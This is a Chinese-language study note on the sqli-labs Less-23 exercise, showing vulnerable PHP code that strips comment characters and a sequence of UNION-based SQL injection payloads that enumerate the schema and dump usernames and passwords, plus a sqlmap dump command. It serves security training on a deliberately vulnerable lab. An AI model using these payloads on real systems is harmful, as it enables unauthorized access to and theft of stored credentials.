# Less-23 基于错误的无注释符注入

查看分析源码
```php
$reg = "/#/";
$reg1 = "/--/";
$id = preg_replace($reg, "", $id);
$id = preg_replace($reg1, "", $id);

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```
#注释符和--注释符都被替换成了空字符串

不能再用--+或者#注释

解决：不用注释符，利用语句本身的单引号来闭合

?id=1' 报错
?id=1' and '1'='1 正常回显
判断'闭合

注意点：
- UNION SELECT 不带 WHERE → 末尾加 '（做别名）
- UNION SELECT 带 WHERE → 末尾用 and '1'='1
- 查 information_schema → 字段加 collate utf8_general_ci（字符集冲突）
- from users ' → 空别名会报错，改成 where 1=1 or '1'='1

#爆列数
?id=-1' union select 1,2,3 '

#爆库名
?id=-1' union select 1,2,database() '

#爆表名（带where+字符集冲突，加collate+and闭合）
?id=-1' union select 1,2,group_concat(table_name) collate utf8_general_ci from information_schema.tables where table_schema=database() and '1'='1

#爆字段
?id=-1' union select 1,2,group_concat(column_name) collate utf8_general_ci from information_schema.columns where table_schema=database() and table_name='users' and '1'='1

#爆数据（同表无字符集冲突，用where吃掉末尾引号）
?id=-1' union select 1,group_concat(username),group_concat(password) from users where 1=1 or '1'='1
![](99_Attachments/图片/Less-23/file-20260602154329444.png)

---

用sqlmap跑：
sqlmap -u "http://ip:8848/Less-23/?id=1" --batch --dbms=mysql -D security -T users --dump
